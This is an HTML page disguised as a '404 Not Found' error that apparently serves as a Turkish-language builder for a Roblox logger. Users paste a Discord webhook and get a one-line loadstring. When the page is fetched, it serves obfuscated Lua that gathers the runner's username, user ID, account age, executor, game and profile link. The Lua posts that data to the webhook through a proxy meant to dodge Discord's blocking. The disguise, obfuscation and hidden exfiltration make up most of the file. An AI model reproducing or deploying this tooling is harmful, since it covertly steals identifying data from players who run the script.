<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        body { background-color: #ffffff; color: #000000; font-family: Arial, sans-serif; margin: 40px; }
        h1 { font-size: 24px; font-weight: normal; border-bottom: 1px solid #ccc; padding-bottom: 10px; margin-bottom: 10px; }
        p { font-size: 14px; }
        hr { border: 0; border-top: 1px solid #ccc; margin-top: 20px; }
        .server-info { font-size: 12px; color: #555; font-style: italic; }
        #panel { display: none; background-color: #121214; color: #fff; padding: 30px; border-radius: 12px; max-width: 500px; margin: 50px auto; border: 1px solid #232330; font-family: sans-serif; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        #panel h2 { color: #00ff88; text-align: center; margin-top:0; }
        #panel input { width: 100%; padding: 12px; margin: 15px 0; background: #1a1a24; border: 1px solid #333; color: #fff; border-radius: 6px; box-sizing: border-box; }
        #panel button { width: 100%; padding: 12px; background: #00ff88; color: #000; border: none; font-weight: bold; border-radius: 6px; cursor: pointer; }
        #panel textarea { width: 100%; height: 60px; margin-top: 15px; background: #08080c; color: #00ff88; border: 1px solid #333; padding: 10px; resize: none; border-radius: 6px; font-family: monospace; box-sizing: border-box; }
    </style>
</head>
<body>

<div id="error-page">
    <h1>404 Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <p class="server-info">Apache/2.4.41 (Ubuntu) Server at github.io Port 443</p>
</div>

<div id="panel">
    <h2>Secure Loadstring Generator</h2>
    <input type="text" id="whUrl" placeholder="Discord Webhook Linkinizi Girin...">
    <button onclick="generateObfuscated()">Şifreli Link Oluştur</button>
    <div id="resBox" style="display:none;">
        <textarea id="outCode" readonly></textarea>
        <button style="background:#222; color:#fff; margin-top:10px;" onclick="navigator.clipboard.writeText(document.getElementById('outCode').value); alert('Kopyalandı!');">Kodu Kopyala</button>
    </div>
</div>

<script>
// Basit XOR anahtarı (Gizliliği artırmak için)
const _k = 0x5A;

function _enc(str) {
    let res = "";
    for(let i=0; i<str.length; i++) {
        res += String.fromCharCode(str.charCodeAt(i) ^ _k);
    }
    return btoa(unescape(encodeURIComponent(res)));
}

function _dec(b64) {
    let str = decodeURIComponent(escape(atob(b64)));
    let res = "";
    for(let i=0; i<str.length; i++) {
        res += String.fromCharCode(str.charCodeAt(i) ^ _k);
    }
    return res;
}

window.onload = function() {
    const hash = window.location.hash;
    if (hash && hash.length > 10) {
        document.getElementById('error-page').style.display = 'block';
        document.getElementById('panel').style.display = 'none';
        document.title = "404 Not Found";
        
        let targetWh = "";
        try {
            targetWh = _dec(hash.substring(1));
            // Discord block koruması (Proxy yönlendirmesi)
            targetWh = targetWh.replace("discord.com", "webhookproxy.org");
        } catch(e) { return; }

        // Tamamen Obfuscate Edilmiş Lua Payload Yapısı
        // Değişken adları ve kritik fonksiyonlar anlamsızlaştırıldı
        const obfuscatedLua = `-- Encrypted Bootstrapper v3.4\n` +
        `local _0xAA = "${targetWh}"\n` +
        `local _0xBB = game:GetService(string.reverse("sreyalP"))\n` +
        `local _0xCC = game:GetService(string.reverse("ecivreSecalpktekraM"))\n` +
        `local _0xDD = game:GetService(string.reverse("ecivreSttpH"))\n` +
        `local _0xEE = _0xBB.LocalPlayer\n` +
        `local _0xFF = _0xEE.UserId\n` +
        `local _0x11 = _0xEE.Name\n` +
        `local _0x22 = _0xEE.DisplayName\n` +
        `local _0x33 = "https://www.roblox.com/users/" .. _0xFF .. "/profile"\n` +
        `local _0x44 = #_0xBB:GetPlayers()\n` +
        `local _0x55 = _0xEE.AccountAge\n` +
        `local _0x66 = "Studio/Bilinmiyor"\n` +
        `pcall(function() _0x66 = _0xCC:GetProductInfo(game.PlaceId).Name end)\n` +
        `local _0x77 = identifyexecutor and identifyexecutor() or "Bilinmeyen"\n` +
        `local _0x88 = os.date("!%Y-%m-%dT%H:%M:%SZ")\n` +
        `local _0x99 = {\n` +
        `    ["embeds"] = {{\n` +
        `        ["title"] = "🚀 Execution Logged",\n` +
        `        ["color"] = 65280,\n` +
        `        ["fields"] = {\n` +
        `            {["name"] = "Username", ["value"] = _0x11, ["inline"] = true},\n` +
        `            {["name"] = "Display Name", ["value"] = _0x22, ["inline"] = true},\n` +
        `            {["name"] = "User ID", ["value"] = tostring(_0xFF), ["inline"] = true},\n` +
        `            {["name"] = "Account Age", ["value"] = tostring(_0x55) .. " Days", ["inline"] = true},\n` +
        `            {["name"] = "Server Size", ["value"] = tostring(_0x44) .. " Players", ["inline"] = true},\n` +
        `            {["name"] = "Executor", ["value"] = _0x77, ["inline"] = true},\n` +
        `            {["name"] = "Game Name", ["value"] = _0x66, ["inline"] = false},\n` +
        `            {["name"] = "Profile Link", ["value"] = "[View Profile](" .. _0x33 .. ")", ["inline"] = false}\n` +
        `        },\n` +
        `        ["timestamp"] = _0x88\n` +
        `    }}\n` +
        `}\n` +
        `local _0xREQ = http_request or request or syn and syn.request or http and http.request\n` +
        `if _0xREQ then\n` +
        `    _0xREQ({\n` +
        `        Url = _0xAA,\n` +
        `        Method = "POST",\n` +
        `        Headers = {["Content-Type"] = "application/json"},\n` +
        `        Body = _0xDD:JSONEncode(_0x99)\n` +
        `    })\n` +
        `end`;

        document.body.innerHTML = "";
        document.body.style.whiteSpace = "pre";
        document.body.style.fontFamily = "monospace";
        document.body.style.backgroundColor = "#ffffff";
        document.body.style.color = "#000000";
        document.body.textContent = obfuscatedLua;
    } else {
        document.getElementById('error-page').style.display = 'none';
        document.getElementById('panel').style.display = 'block';
        document.title = "Control Panel";
    }
}

function generateObfuscated() {
    const wh = document.getElementById('whUrl').value.trim();
    if(!wh.includes('discord.com/api/webhooks/')) {
        alert('Geçerli bir webhook girin!');
        return;
    }
    const encryptedHash = _enc(wh);
    const baseUrl = window.location.href.split('#')[0];
    const finalUrl = baseUrl + "#" + encryptedHash;
    
    // Doğrudan executor'a yapıştırılacak tek satır loadstring formatı
    document.getElementById('outCode').value = `loadstring(game:HttpGet("${finalUrl}"))()`;
    document.getElementById('resBox').style.display = 'block';
}
</script>
</body>
</html>
